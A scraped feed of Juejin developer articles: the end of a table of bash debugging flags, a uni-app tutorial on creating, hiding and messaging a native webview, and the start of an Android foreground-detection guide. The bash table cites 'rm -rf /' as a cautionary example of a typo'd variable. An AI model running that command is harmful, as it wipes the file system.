<table><thead><tr><th>参数</th><th>全称</th><th>作用</th><th>使用场景</th></tr></thead><tbody><tr><td>-x</td><td>xtrace</td><td>打印每一行命令的执行轨迹</td><td>逻辑错误调试、变量值检查（<strong>最常用</strong>）</td></tr><tr><td>-v</td><td>verbose</td><td>打印原始输入行</td><td>通常配合 -x 使用，用于对比“代码原样”和“执行实况”</td></tr><tr><td>-n</td><td>noexec</td><td>只检查语法，不运行脚本</td><td>检查是否有 if 没写 fi、漏了引号等低级语法错误</td></tr><tr><td>-u</td><td>nounset</td><td>遇到未定义变量则报错</td><td><strong>防御性编程</strong>。防止因为变量名打错（如 $file_name 写成 $filename）导致 rm -rf /$filename 变成 rm -rf / 的惨剧</td></tr></tbody></table>
<p>⚙️ 行为控制与运行模式</p>



































<table><thead><tr><th>参数</th><th>全称</th><th>作用</th><th>使用场景</th></tr></thead><tbody><tr><td>-f</td><td>noglob</td><td>禁止通配符扩展。即 *, ? 不再自动扩展为文件名</td><td>当脚本需要处理大量包含 * 的特殊字符串（而非文件名）时开启</td></tr><tr><td>-e</td><td>errexit</td><td>遇到错误立即退出</td><td><strong>CI/CD 必备</strong>。构建脚本一旦某一步出错，不要继续执行后续操作</td></tr><tr><td>-i</td><td>interactive</td><td>强制脚本以交互 Shell 行为运行</td><td>调试.bashrc或需要模拟用户终端输入（TTY）的脚本</td></tr><tr><td>-t</td><td>-</td><td>读取并执行完<strong>一条</strong>命令后立刻退出</td><td>极少用的调试手段，用于精细控制脚本启动的第一步状态</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[uni-app使用html5+创建webview，可以控制窗口大小、显隐、与uni通信]]></title>    <link>https://juejin.cn/post/7594863660297994282</link>    <guid>https://juejin.cn/post/7594863660297994282</guid>    <pubDate>2026-01-14T11:03:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594863660297994282" data-draft-id="7594262760939700258" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="uni-app使用html5+创建webview，可以控制窗口大小、显隐、与uni通信"/> <meta itemprop="keywords" content="前端,Trae"/> <meta itemprop="datePublished" content="2026-01-14T11:03:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="李剑一"/> <meta itemprop="url" content="https://juejin.cn/user/4147782344247918"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            uni-app使用html5+创建webview，可以控制窗口大小、显隐、与uni通信
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4147782344247918/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    李剑一
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T11:03:25.000Z" title="Wed Jan 14 2026 11:03:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>最近使用 uni-app 开发安卓端的 App，因为要嵌入一个原本已经开发完的系统，打算使用 web-view 的方式进行嵌入。</p>
<p>因为项目工期比较紧，所以是两个前端并行开发，最后再合到一起。</p>
<p>结果就是这个过程中出问题了...</p>
<h2 data-id="heading-0">需求</h2>
<p>需求方面是：</p>
<p><code>A同学</code>负责通讯方面的工作，所以页面应该在首页加载的时候就被挂载上去，这样一来启动系统的时候就注册了通讯模块，不影响收发信息。</p>
<p><code>B同学</code>负责其他部分，在首页展示系统内部的统计数据，可以算是一个安卓端的简易大屏。</p>
<p>原本<code>A同学</code>的方案是在系统页面上创建一个 <code>web-view</code>，然后嵌入系统。这样一来也不影响B同学开发新系统。</p>
<h2 data-id="heading-1">问题</h2>
<p>结果整合代码的时候才发现，<code>web-view</code>标签 是<strong>自动铺满整个页面</strong>的，而且是<strong>无法隐藏</strong>的。</p>
<p>这就尴尬了，App进来以后直接看到的就是 <code>A同学</code>的通讯页面，无法看到<code>B同学</code>的大屏了。</p>
<p>问题抛到了我手里，我经过一番简单的调研，再加上一顿猛如虎的操作，又通过 <strong>Trae</strong> 一顿AI，最后回复他们说：<strong>无解</strong>！</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/43f8dfd3e0884546ab40824d14f7de63~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5YmR5LiA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768993404&amp;x-signature=lUwkIJyI5td7ffl7BJad83W77OI%3D" alt="image.png" loading="lazy"/></p>
<p>对此 <strong>Trae</strong> 给出的原因是：uni-app 中内置的 <code>web-view</code> 标签本身没有隐藏的API，在 web-view 标签外增加 view 标签，绑定 <code>v-show</code> 方法不生效。</p>
<p>只能绑定 <code>v-if</code> 生效，但是绑定 <code>v-if=false</code> 的时候相当于 web-view 直接被<strong>销毁</strong>了，会导致通讯模块收不到信息。</p>
<h2 data-id="heading-2">解决</h2>
<p>好在天无绝人之路，uni-app 官方文档中表示：在 html5+ 中其实存在 web-view 的 API，能够操作窗口的大小。</p>
<p>那么既然能够操作窗口的大小，肯定也能够控制显隐。</p>
<p>于是乎我使用 <strong>Trae</strong> 让他使用 html5+ 中的 <code>create</code> 方法创建 web-view，并给出完整的解决方案。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">createWebView</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">let</span> that = <span class="hljs-variable language_">this</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span> = plus.<span class="hljs-property">webview</span>.<span class="hljs-title function_">create</span>(
        <span class="hljs-string">'http://192.168.25.110'</span>,
        <span class="hljs-string">'1008610010'</span> <span class="hljs-comment">// ID（必须唯一）</span>
        {
            <span class="hljs-attr">top</span>: <span class="hljs-string">'24px'</span>,
            <span class="hljs-attr">bottom</span>: <span class="hljs-string">'0px'</span>,
            <span class="hljs-attr">width</span>: <span class="hljs-string">'300px'</span>,
            <span class="hljs-attr">height</span>: <span class="hljs-string">'600px'</span>,
            <span class="hljs-attr">scrollIndicator</span>: <span class="hljs-string">'none'</span>,
            <span class="hljs-attr">scalable</span>: <span class="hljs-literal">false</span>
        }
    );

    <span class="hljs-comment">// 设置页面默认隐藏</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span>.<span class="hljs-title function_">hide</span>();
}
</code></pre>
<p>这时候已经成功创建了 web-view 并且处于隐藏状态，不耽误传参。</p>
<p>但是又遇到了一个问题，web-view无法与uni-app<strong>通信</strong>。</p>
<p>Trae 先给出了 uni-app 官方提供的方法，使用 <code>uni.postMessage</code> 方法，但是在通讯系统中插入了这个方法以后，不报错，并且显示发送消息成功，但uni-app 这边却无法接收到。</p>
<p>Trae 又使用 <code>evalJS</code> 方法插入相应的脚本，但是也没有反应。同样是发送成功，但是接收不到。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c0b779ce4c0a4794bd4cdced445bdf0b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5YmR5LiA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768993404&amp;x-signature=wYXK%2FZQTfX9bGYH%2B5khBzLiAuOE%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<p>两种方案均不可用，我又详细看了看 uni-app 的官方文档，让 Trae 分析 web-view 标签上绑定的 <code>@message</code> 方法应该是经过特殊封装的，能够捕获到 view-view 内使用 <code>uni.postMessage</code> 方法发送的数据。</p>
<p>Trae给出的解释是：由于我现在使用 <code>plus.web-view.create</code> 创建窗口，绕过了uni-app 所以即便是绑定 <code>message</code> 也无效了。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b0c925c31d3435ab879f6a3908f9626~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5YmR5LiA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768993404&amp;x-signature=Z%2B%2Fx0VnhbT5iKgYi9Gqpbs1TiiU%3D" alt="image.png" loading="lazy"/></p>
<p>所以采用 html+ 原生方法发送数据，在 web-view 中使用 <code>plus.webview.postMessageToUniNView</code> 方法发送数据。</p>
<p>在 uni-app 端使用 <code>plus.globalEvent.addEventListener</code> 接收数据。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 发送数据</span>
<span class="hljs-title function_">pushMessage</span>(<span class="hljs-params"/>) {
    plus.<span class="hljs-property">webview</span>.<span class="hljs-title function_">postMessageToUniNView</span>({
        <span class="hljs-attr">type</span>: <span class="hljs-string">'tpUniAPP'</span>,
        <span class="hljs-attr">args</span>: {
            <span class="hljs-attr">args1</span>: <span class="hljs-string">'test123'</span>
        }
    }, <span class="hljs-string">'__uniapp__service'</span>);
}
</code></pre>
<p>接收数据方法写在 <code>createWebView</code> 方法内。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 接收数据</span>
<span class="hljs-title function_">createWebView</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">let</span> that = <span class="hljs-variable language_">this</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-comment">// 创建一个新的 WebView</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span> = plus.<span class="hljs-property">webview</span>.<span class="hljs-title function_">create</span>(
        ...
    );
    
    <span class="hljs-comment">// web-view加载完成</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'loaded'</span>, <span class="hljs-function">() =&gt;</span> {
        plus.<span class="hljs-property">globalEvent</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'plusMessage'</span>, <span class="hljs-function">(<span class="hljs-params">message</span>)=&gt;</span>{
            <span class="hljs-keyword">let</span> data = message?.<span class="hljs-property">data</span>?.<span class="hljs-property">args</span>?.<span class="hljs-property">data</span>;
            <span class="hljs-keyword">if</span>(data?.<span class="hljs-property">name</span> === <span class="hljs-string">'postMessage'</span>) {
                <span class="hljs-keyword">if</span> (data?.<span class="hljs-property">arg</span>?.<span class="hljs-property">type</span> === <span class="hljs-string">'show'</span>) {
                    <span class="hljs-comment">// 显示</span>
                    that.<span class="hljs-property">webviewIns</span>.<span class="hljs-title function_">show</span>();
                }
                <span class="hljs-keyword">if</span> (data?.<span class="hljs-property">arg</span>?.<span class="hljs-property">type</span> === <span class="hljs-string">'hide'</span>) {
                    <span class="hljs-comment">// 隐藏</span>
                    that.<span class="hljs-property">webviewIns</span>.<span class="hljs-title function_">hide</span>();
                }
            }
        })
    });
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span>.<span class="hljs-title function_">hide</span>();
},
</code></pre>
<h2 data-id="heading-3">结论</h2>
<p>目前主要解决了两个问题：</p>
<ol>
<li>web-view 大小、显隐不可控问题。</li>
<li>web-view 与 uni-app 通信问题。</li>
</ol>
<p>发送数据方法可以卸载 Pinia 的公共方法中，或者使用 EventBus，统一处理。</p>
<p>Ps: 第二个问题解决方案不是太优雅，如果有兄弟有更好的方案可以分享一下。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android 开发中，准确判断应用处于“前台（Foreground）”还是“后台（Background）]]></title>    <link>https://juejin.cn/post/7595108457496346639</link>    <guid>https://juejin.cn/post/7595108457496346639</guid>    <pubDate>2026-01-15T06:28:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595108457496346639" data-draft-id="7595147176752332800" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android 开发中，准确判断应用处于“前台（Foreground）”还是“后台（Background）"/> <meta itemprop="keywords" content="Android,客户端,APP"/> <meta itemprop="datePublished" content="2026-01-15T06:28:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Gemini001"/> <meta itemprop="url" content="https://juejin.cn/user/2333635831676704"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android 开发中，准确判断应用处于“前台（Foreground）”还是“后台（Background）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2333635831676704/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Gemini001
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T06:28:55.000Z" title="Thu Jan 15 2026 06:28:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Android 应用前后台状态判断深度解析</h2>
<p>在 Android 开发中，准确判断应用处于<strong>前台（Foreground）</strong> 还是<strong>后台（Background）</strong> 是实现很多业务逻辑的基础。本文将深入分析目前最为主流且可靠的两种实现方式：<strong>Jetpack ProcessLifecycleOwner</strong>​ 和 <strong>ActivityLifecycleCallbacks 计数法</strong>，并从源码角度分析它们的底层工作原理。</p>
<hr/>
<h3 data-id="heading-1">一、方案一：Jetpack ProcessLifecycleOwner（官方首选）</h3>
<p>这是 Google 推荐的标准做法。它将整个 App 的进程抽象为一个 <code>LifecycleOwner</code>。</p>
<h4 data-id="heading-2">1. 使用方法</h4>
<p>在 <code>build.gradle</code>中引入：</p>
<pre><code class="hljs language-arduino" lang="arduino">implementation <span class="hljs-string">"androidx.lifecycle:lifecycle-process:2.6.2"</span>
</code></pre>
<p>在 <code>Application</code>中监听：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApp</span> : <span class="hljs-type">Application</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.onCreate()
        ProcessLifecycleOwner.<span class="hljs-keyword">get</span>().lifecycle.addObserver(
            <span class="hljs-keyword">object</span> : DefaultLifecycleObserver {
                <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onStart</span><span class="hljs-params">(owner: <span class="hljs-type">LifecycleOwner</span>)</span></span> {
                    <span class="hljs-comment">// App 回到前台</span>
                }
                
                <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onStop</span><span class="hljs-params">(owner: <span class="hljs-type">LifecycleOwner</span>)</span></span> {
                    <span class="hljs-comment">// App 退到后台</span>
                }
            }
        )
    }
}
</code></pre>
